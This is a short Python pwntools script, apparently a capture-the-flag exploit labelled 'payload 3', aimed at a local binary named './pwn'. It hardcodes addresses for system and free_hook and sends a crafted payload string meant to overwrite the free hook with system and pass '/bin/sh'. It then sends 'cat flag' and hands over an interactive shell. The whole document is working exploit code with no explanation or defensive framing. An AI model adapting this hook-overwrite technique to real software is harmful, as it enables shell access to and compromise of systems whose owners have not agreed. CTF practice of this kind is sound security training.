# payload 3
#!/usr/bin/python

from pwn import *
context.log_level = "debug"
r = process('./pwn')
#gdb.attach(r)
#raw_input()
#jia 40
g = 0x7015A0
system = 0x421080
free_hook = 0x700EE8#0x700EC8
s = 0x7015D8
pay = "38.0x700Ef0.1.0x421070.13.38.0x7015e0.1.0x7015a0.13.38.0x7015a8.1./bin/sh.13."
r.sendline(pay)
r.sendline('cd ./')
r.sendline('cat flag')
r.interactive()
